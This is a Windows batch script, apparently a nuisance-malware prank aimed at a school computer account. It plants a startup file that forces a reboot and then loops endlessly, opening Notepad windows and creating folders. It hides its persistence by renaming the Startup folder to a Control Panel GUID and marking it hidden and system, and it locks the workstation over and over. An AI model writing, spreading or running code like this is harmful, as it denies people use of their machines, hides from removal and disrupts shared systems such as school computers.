REM Creating a file with code
(
echo shutdown /r /t 5
echo set /a num=1
echo cd C:\Users\%username%\Desktop
echo cd C:\Users\%username%\OneDrive - Fairfax County Public Schools\Desktop
echo :a
echo start notepad /max
echo md LLLL_%%num%%
echo num=%%num%%+1
echo goto a
) > File.bat
REM Copying it to startup and then deleting the original
COPY "File.bat" "C:\Users\1651176\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
del File.bat /q
REM renaming the Startup folder to a control panel name and then hide it and set it to a system file
cd "C:\Users\1651176\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
ren Startup "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
atrrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
REM Locking the user out until they reboot which is when the startup folder activates with the file created above in it
:Lock
rundll32.exe user32.dll, LockWorkStation
goto Lock
